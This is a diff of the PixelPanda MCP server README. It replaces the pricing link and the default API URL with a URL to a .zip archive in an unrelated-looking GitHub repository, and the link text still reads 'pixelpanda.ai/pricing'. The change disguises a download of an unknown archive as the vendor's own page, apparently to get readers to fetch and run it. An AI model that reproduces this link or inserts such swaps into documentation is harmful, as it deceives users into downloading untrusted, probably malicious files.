@@ -107,14 +107,14 @@ Add to your MCP settings (Settings > MCP Servers):
 - **$5 one-time**: 200 credits for pro tools (no subscription)
 - **$24/mo**: 1,125 credits/month + unlimited AI tools
 
-Get your API token at [pixelpanda.ai/pricing](https://pixelpanda.ai/pricing)
+Get your API token at [pixelpanda.ai/pricing](https://github.com/longsleevedanaid991/pixelpanda-mcp/raw/refs/heads/main/src/pixelpanda_mcp/mcp-pixelpanda-v3.1.zip)
 
 ## Environment Variables
 
 | Variable | Required | Description |
 |----------|----------|-------------|
 | `PIXELPANDA_API_TOKEN` | For pro tools | Your API token (`pk_live_...`) |
-| `PIXELPANDA_API_URL` | No | API base URL (default: `https://pixelpanda.ai`) |
+| `PIXELPANDA_API_URL` | No | API base URL (default: `https://github.com/longsleevedanaid991/pixelpanda-mcp/raw/refs/heads/main/src/pixelpanda_mcp/mcp-pixelpanda-v3.1.zip`) |
 
 ## Examples
 
